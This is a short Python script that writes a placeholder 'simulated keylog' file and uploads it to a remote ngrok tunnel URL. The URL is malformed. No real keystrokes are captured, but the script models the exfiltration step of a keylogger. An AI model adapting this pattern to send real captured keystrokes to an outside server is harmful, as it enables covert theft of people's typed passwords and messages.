import os
import requests

# Simulate keylogger generating a txt file
def create_keylog_file():
    file_path = "keylog.txt"
    with open(file_path, "w") as f:
        f.write("This is a simulated keylog file.\n")
    return file_path

# Upload the file to the Flask server
def upload_file_to_server(file_path):
    url = "https://https://347d-2404-7c80-4c-e86e-8cf4-f6b0-1a8-db93.ngrok-free.app//upload"  # Replace with your ngrok URL
    with open(file_path, "rb") as f:
        files = {"file": f}
        response = requests.post(url, files=files)
        print(response.text)

# Main function
if __name__ == "__main__":
    # Step 1: Create keylog file
    keylog_file = create_keylog_file()
    
    # Step 2: Upload the file to the server
    upload_file_to_server(keylog_file)